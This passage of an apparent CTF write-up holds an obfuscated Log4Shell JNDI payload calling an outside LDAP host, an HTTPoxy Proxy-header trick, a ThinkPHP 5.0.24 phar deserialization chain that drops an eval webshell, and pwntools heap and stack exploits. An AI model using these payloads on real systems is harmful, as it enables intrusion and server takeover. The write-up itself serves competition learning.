<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;kBQ:aUR:j:-j&#125;$&#123;MoYvsH:XAND:kG:-n&#125;$&#123;EdAUxY:ck:pyjko:RIasA:-d&#125;$&#123;hNhKmh:E:c:-i&#125;$&#123;l:MLjM:-:&#125;$&#123;qvO:STYFpz:ufnqW:V:-l&#125;$&#123;G:mIWH:-d&#125;$&#123;er:WLe:J:Pl:kCih:-a&#125;$&#123;yHjTcA:FM:e:IktQAC:-p&#125;$&#123;bvaWm:WW:-:&#125;$&#123;kB:hGD:GPI:-/&#125;$&#123;GC:VOUh:dqINYx:FK:n:-/&#125;$&#123;v:KHSOc:-1&#125;$&#123;Li:-9&#125;$&#123;QtYkc:o:CQBzJl:D:-2&#125;$&#123;KmJs:oJznyf:oIDrB:zmdK:-.&#125;$&#123;F:ttejsH:k:rI:-1&#125;$&#123;gN:-6&#125;$&#123;tB:aJqxS:-8&#125;$&#123;arq:J:wcas:d:-.&#125;$&#123;rh:Rcz:-2&#125;$&#123;z:Gvz:-.&#125;$&#123;F:-2&#125;$&#123;IsgAtf:-3&#125;$&#123;CPsF:QRLx:dICC:rMp:-8&#125;$&#123;o:Kk:hmhWl:XjIbnJ:-:&#125;$&#123;kp:-1&#125;$&#123;PeOoN:Y:mIFi:-3&#125;$&#123;P:-8&#125;$&#123;YMhc:EJ:uD:Wwytb:-9&#125;$&#123;OLPfY:YTvJf:m:OXdV:-/&#125;$&#123;rf:Uagil:PDiuPH:-T&#125;$&#123;PBKgU:NhAyi:MpIN:-o&#125;$&#123;awgT:-m&#125;$&#123;aS:TCt:xnzwfF:UNaIr:Ppp:-c&#125;$&#123;II:kNl:uHtTJi:WXfR:UjzJC:-a&#125;$&#123;jBHdVl:PB:-t&#125;$&#123;bkgfV:sYiJoF:uBIIDN:-B&#125;$&#123;WROI:-y&#125;$&#123;U:F:GAnUD:-p&#125;$&#123;nQMY:-a&#125;$&#123;yqYF:-s&#125;$&#123;cVWi:rs:NFv:f:wmqbfG:-s&#125;$&#123;XjHqnt:sP:uSjj:dWkcba:njEm:-/&#125;$&#123;CY:-T&#125;$&#123;qeW:-o&#125;$&#123;tLipT:GjC:YGc:-m&#125;$&#123;WmRvEy:pIxR:ur:LroYD:woOzUb:-c&#125;$&#123;ye:d:sR:NsdI:-a&#125;$&#123;OyXQBo:KSC:blRvH:iMLj:DxG:-t&#125;$&#123;MOGEk:VnN:-E&#125;$&#123;nxrEv:dKbcF:iEWJOf:-c&#125;$&#123;Jd:GTm:rJ:KsWYpp:oz:-h&#125;$&#123;UjBT:hMh:-o&#125;&#125;</span><br><span class="line"></span><br><span class="line">$&#123;j$&#123;iqV:xQtVwM:-n&#125;d$&#123;WnFLI:-i&#125;$&#123;j:YxXkbc:QpCi:k:QA:-:&#125;$&#123;tuNJ:pa:vDTPc:-l&#125;dap:$&#123;mxyDc:-/&#125;/$&#123;X:A:wJfVUX:-1&#125;$&#123;u:si:TmOs:-9&#125;2$&#123;x:DGbnfN:-.&#125;$&#123;h:Ga:H:Gmiv:zYQf:-1&#125;6$&#123;dqV:KYvLFD:Edfgq:HzKoK:-8&#125;$&#123;KNzKwB:IEJiU:-.&#125;$&#123;QMgb:NTVFr:gM:-2&#125;.2$&#123;VPb:kgVqX:vMNFgF:EV:iyt:-3&#125;8:1$&#123;nOhh:uTaV:TlMnJ:J:FM:-3&#125;$&#123;zUKT:mVGhb:RHbf:ypvu:-8&#125;$&#123;y:bPcT:g:Ya:-9&#125;$&#123;EDXJQ:Eetclr:oSVeHz:J:-/&#125;To$&#123;GbLFYe:UpYi:-m&#125;cat$&#123;UaV:Mo:Fu:UDboa:ePDD:-B&#125;$&#123;uzqh:O:lxU:UFRpQk:gGbqT:-y&#125;p$&#123;l:pJeje:P:s:vjiPI:-a&#125;$&#123;LCJ:vM:Ebt:LJmS:-s&#125;$&#123;pXuvuL:oWk:kXTgAe:kml:-s&#125;$&#123;WbhDYc:u:Ne:Slcje:-/&#125;$&#123;M:-T&#125;omc$&#123;kBm:V:iVQ:-a&#125;$&#123;cYCt:-t&#125;$&#123;iGHgwi:I:-E&#125;cho&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【Flag配送中心】"><a href="#【Flag配送中心】" class="headerlink" title="【Flag配送中心】"></a>【Flag配送中心】</h3><p>HTTPoxy漏洞（CVE-2016-5385）</p>
<p>VPS上监听对应端口后，在HTTP请求包中添加Proxy头：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Proxy: http://VPS:POST/</span><br></pre></td></tr></table></figure>

<p>即可监听到Flag</p>
<h3 id="【tp】"><a href="#【tp】" class="headerlink" title="【tp】"></a>【tp】</h3><p><code>thinkphp5.0.24</code> 反序列化</p>
<p>通过网上<code>poc</code> 生成<code>phar</code> 文件后，上传</p>
<p>然后变量覆盖，传入：<code>?FILES\[file\]\[name\]=phar://【上传的phar 文件名】</code></p>
<p>触发<code>phar</code> 反序列化，生成<code>webshell</code></p>
<p><strong>生成phar 的poc</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes &#123;</span><br><span class="line">    class Windows &#123;</span><br><span class="line">        private $files = [];</span><br><span class="line"></span><br><span class="line">        public function __construct($files)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;files = [$files]; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think &#123;</span><br><span class="line">    abstract class Model&#123;</span><br><span class="line">        protected $append = [];</span><br><span class="line">        protected $error = null;</span><br><span class="line">        public $parent;</span><br><span class="line"></span><br><span class="line">        function __construct($output, $modelRelation)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;parent = $output; </span><br><span class="line">            $this-&gt;append = array(&quot;xxx&quot;=&gt;&quot;getError&quot;);    </span><br><span class="line">            $this-&gt;error = $modelRelation;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model&#123;</span><br><span class="line">    use think\Model;</span><br><span class="line">    class Pivot extends Model&#123;</span><br><span class="line">        function __construct($output, $modelRelation)</span><br><span class="line">        &#123;</span><br><span class="line">            parent::__construct($output, $modelRelation);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation&#123;</span><br><span class="line">    class HasOne extends OneToOne &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\model\relation &#123;</span><br><span class="line">    abstract class OneToOne</span><br><span class="line">    &#123;</span><br><span class="line">        protected $selfRelation;</span><br><span class="line">        protected $bindAttr = [];</span><br><span class="line">        protected $query;</span><br><span class="line">        function __construct($query)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;selfRelation = 0;</span><br><span class="line">            $this-&gt;query = $query;    //$query指向Query</span><br><span class="line">            $this-&gt;bindAttr = [&#x27;xxx&#x27;];// $value值，作为call函数引用的第二变量</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\db &#123;</span><br><span class="line">    class Query &#123;</span><br><span class="line">        protected $model;</span><br><span class="line"></span><br><span class="line">        function __construct($model)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;model = $model; //$this-&gt;model=&gt; think\console\Output;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\console&#123;</span><br><span class="line">    class Output&#123;</span><br><span class="line">        private $handle;</span><br><span class="line">        protected $styles;</span><br><span class="line">        function __construct($handle)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;styles = [&#x27;getAttr&#x27;];</span><br><span class="line">            $this-&gt;handle =$handle; //$handle-&gt;think\session\driver\Memcached</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\session\driver &#123;</span><br><span class="line">    class Memcached</span><br><span class="line">    &#123;</span><br><span class="line">        protected $handler;</span><br><span class="line"></span><br><span class="line">        function __construct($handle)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;handler = $handle; //$handle-&gt;think\cache\driver\File</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\cache\driver &#123;</span><br><span class="line">    class File</span><br><span class="line">    &#123;</span><br><span class="line">        protected $options=null;</span><br><span class="line">        protected $tag;</span><br><span class="line"></span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;options=[</span><br><span class="line">                &#x27;expire&#x27; =&gt; 3600,</span><br><span class="line">                &#x27;cache_subdir&#x27; =&gt; false,</span><br><span class="line">                &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">                &#x27;path&#x27;  =&gt; &#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../../../../../../../../../../var/www/html/&#x27;,</span><br><span class="line">                &#x27;data_compress&#x27; =&gt; false,</span><br><span class="line">            ];</span><br><span class="line">            $this-&gt;tag = &#x27;xxx&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $Memcached = new think\session\driver\Memcached(new \think\cache\driver\File());</span><br><span class="line">    $Output = new think\console\Output($Memcached);</span><br><span class="line">    $model = new think\db\Query($Output);</span><br><span class="line">    $HasOne = new think\model\relation\HasOne($model);</span><br><span class="line">    $window = new think\process\pipes\Windows(new think\model\Pivot($Output,$HasOne));</span><br><span class="line"></span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); </span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">    $phar-&gt;setMetadata($window);        </span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);        </span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h3 id="【pwn1】"><a href="#【pwn1】" class="headerlink" title="【pwn1】"></a>【pwn1】</h3><p>pwn签到题，唯一有点坑就是在出函数时并不仅仅是leave；ret，而是多出了两行汇编代码。因此需要我们分析和调试一下。<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199866613426.webp" alt="图片"></p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;pwn1&#x27;)</span><br><span class="line">io.recvuntil(&quot;:&quot;)</span><br><span class="line">stack = int(io.recv(10),16)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(&#x27;a&#x27;*0x30+p32(0x8048540)+p32(stack+0x34))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="【pwn2】"><a href="#【pwn2】" class="headerlink" title="【pwn2】"></a>【pwn2】</h3><p>libc-2.27的off-by-one，细心一点就能发现for循环这块会让我们多输入一个字节。</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199871632928.webp" alt="图片"></p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./pwn2&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn2&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line"> io.sendlineafter(&#x27;Choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;size: &#x27;,str(size))</span><br><span class="line"> io.sendafter(&#x27;content: &#x27;,content)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line"> io.sendlineafter(&#x27;Choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line"> io.sendlineafter(&#x27;content: &#x27;,content)</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line"> io.sendlineafter(&#x27;Choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line"> io.sendlineafter(&#x27;Choice: &#x27;,&#x27;4&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;idx: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#0</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#1</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#2</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#3</span><br><span class="line"> add(0x18,&#x27;f1ag\n&#x27;)#4</span><br><span class="line"> dele(2)</span><br><span class="line"> add(0xf8,&#x27;a&#x27;*0xf0+p64(0x300)+&#x27;\n&#x27;)#2</span><br><span class="line"></span><br><span class="line"> for i in range(7):</span><br><span class="line">  add(0xf8,&#x27;a\n&#x27;)#5~11</span><br><span class="line"> for i in range(7):</span><br><span class="line">  dele(11-i)</span><br><span class="line"> </span><br><span class="line"> dele(0)</span><br><span class="line"> gdb.attach(io)</span><br><span class="line"> dele(3)</span><br><span class="line"> for i in range(7):</span><br><span class="line">  add(0xf8,&#x27;f1ag\n&#x27;)#0,3,5~9</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#10</span><br><span class="line"> show(1)</span><br><span class="line"> malloc_hook = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line"> libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line"> print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line"> free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line"> system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line"></span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#11=1</span><br><span class="line"> dele(1)</span><br><span class="line"> edit(11,p64(free_hook-8)+&#x27;\n&#x27;)</span><br><span class="line"> add(0xf8,&#x27;f1ag\n&#x27;)#1</span><br><span class="line"> add(0xf8,&#x27;/bin/sh\x00&#x27;+p64(system)+&#x27;\n&#x27;)#12</span><br><span class="line"> dele(12)</span><br><span class="line"> io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h3 id="【pwn3】"><a href="#【pwn3】" class="headerlink" title="【pwn3】"></a>【pwn3】</h3><p>这个题利用的是strcpy、strcat等一些对字符串操作的函数的漏洞，当他们复制字符串的时候会把字符串的最后一个字节\x00给带上，极容易造成off-by-null漏洞。而这个题的漏洞点正在于此，\x00正好将存放长度的地址覆盖置0，就可以将长度的值改写为一个很大的值，打败boss进入到奖励函数中。<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199876154830.webp" alt="图片"></p>
<p>因为有exit函数，很容易联想到打exit_hook。[exit_hook的知识点]( PWN学习—exit_hook-偷家 - BlackBird’s Blog (blackbird-bb.github.io) ) 参考这位西电大佬写的博客，然后直接打onegadget就ok了。在打one_gadget的时候正常出来的四个gadget不能打通，这时候在one_gadget后加上-l2可以找到更多的gadget。</p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./Gpwn3&#x27;)</span><br><span class="line">io=remote(&#x27;127.0.0.1&#x27;,10002)</span><br><span class="line">elf=ELF(&#x27;./Gpwn3&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def create(description):</span><br><span class="line"> io.sendlineafter(&#x27;choice:&#x27;,&#x27;1&#x27;)</span><br><span class="line"> io.sendafter(&#x27; level :\n&#x27;,description)</span><br><span class="line"></span><br><span class="line">def power(description):</span><br><span class="line"> io.sendlineafter(&#x27;choice:&#x27;,&#x27;2&#x27;)</span><br><span class="line"> io.sendafter(&#x27;another level :&#x27;,description) </span><br><span class="line"></span><br><span class="line">def beat(): </span><br><span class="line"> io.sendlineafter(&#x27;choice:&#x27;,&#x27;3&#x27;)</span><br><span class="line"></span><br><span class="line">def give_up():</span><br><span class="line"> io.sendlineafter(&#x27;choice:&#x27;,&#x27;4&#x27;)</span><br><span class="line">   </span><br><span class="line">def exp():</span><br><span class="line"> create(&#x27;a&#x27;*35+&#x27;\n&#x27;)</span><br><span class="line"> power(&#x27;a&#x27;)</span><br><span class="line"> power(&#x27;\xff\xff\xff\xff&#x27;)</span><br><span class="line"> beat()</span><br><span class="line"> </span><br><span class="line"> io.recvuntil(&#x27;reward: &#x27;)</span><br><span class="line"> puts=int(io.recv(14),16)</span><br><span class="line"> libc_base=puts-libc.symbols[&#x27;puts&#x27;] </span><br><span class="line"> print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line"> system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line"> binsh=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line"> dl_rtld_unlock_recursive = libc_base+0x5f0040+3856</span><br><span class="line"> gadget=[0x45226,0x4527a,0xf03a4,0xf1247,0xcd173,0xcd248,0xf03b0,0xf67f0]</span><br><span class="line"> #gdb.attach(io)</span><br><span class="line"> io.sendafter(&#x27;your name:&#x27;,p64(dl_rtld_unlock_recursive))</span><br><span class="line"> </span><br><span class="line"> io.sendafter(&#x27;for you!&#x27;,p64(gadget[7]+libc_base))</span><br><span class="line"> io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h3 id="【pwn4】"><a href="#【pwn4】" class="headerlink" title="【pwn4】"></a>【pwn4】</h3><p>这个题有个小问题，忘了在add函数后加break跳出switch，因此有师傅修switch时修不出来add，只能看汇编代码，在这里和各位师傅道个歉。</p>
<p>此题的漏洞在free时没有对指针置0，libc-2.31的uaf。<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199883877032.webp" alt="图片"></p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./pwn4&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn4&#x27;)</span><br><span class="line">libc=elf(&#x27;./libc-2.31.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(index,name,key,value):</span><br><span class="line"> io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line"> io.sendlineafter(&#x27;Enter your name: &#x27;,name)</span><br><span class="line"> io.sendlineafter(&#x27;Please input a key: &#x27;,key)</span><br><span class="line"> io.sendlineafter(&#x27;Please input a value: &#x27;,str(value))</span><br><span class="line"> </span><br><span class="line">def show(index):</span><br><span class="line"> io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,name,length,key,value):</span><br><span class="line"> io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line"> io.sendlineafter(&#x27;Enter your name: &#x27;,name)</span><br><span class="line"> io.sendlineafter(&#x27;New key length: &#x27;,str(length))</span><br><span class="line"> io.sendlineafter(&#x27;Key: &#x27;,key)</span><br><span class="line"> io.sendlineafter(&#x27;Value: &#x27;,str(value))</span><br><span class="line"> </span><br><span class="line">def dele(index):</span><br><span class="line"> io.sendlineafter(&#x27;Your choice: &#x27;,&#x27;4&#x27;)</span><br><span class="line"> io.sendlineafter(&#x27;Your index: &#x27;,str(index))</span><br><span class="line"> </span><br><span class="line">def exp():</span><br><span class="line"> add(0,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x417,0)</span><br><span class="line"> add(1,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x3c7,1)</span><br><span class="line"> dele(0)</span><br><span class="line"> show(0)</span><br><span class="line"> malloc_hook = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;)) - 96 -16</span><br><span class="line"> libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line"> print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line"> free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line"> system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line"> </span><br><span class="line"> add(2,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x57,2)</span><br><span class="line"> add(3,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x57,3)</span><br><span class="line"> dele(3)</span><br><span class="line"> dele(2)</span><br><span class="line"> #gdb.attach(io)</span><br><span class="line"> edit(1,&#x27;f1ag&#x27;,8,&#x27;/bin/sh\x00&#x27;,1)</span><br><span class="line"> edit(2,&#x27;f1ag&#x27;,6,p32((free_hook-0x51)&amp;0xffffffff)+p16(((free_hook)&gt;&gt;32)&amp;0xffff),2)</span><br><span class="line"> </span><br><span class="line"> add(4,&#x27;f1ag&#x27;,&#x27;a&#x27;*0x51+p32((system)&amp;0xffffffff)+p16(((system)&gt;&gt;32)&amp;0xffff),&#x27;4&#x27;)</span><br><span class="line"> </span><br><span class="line"> #add(6,&#x27;f1ag&#x27;,p64(system),5)</span><br><span class="line"> </span><br><span class="line"> dele(1)</span><br><span class="line"> io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF-wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
</search>
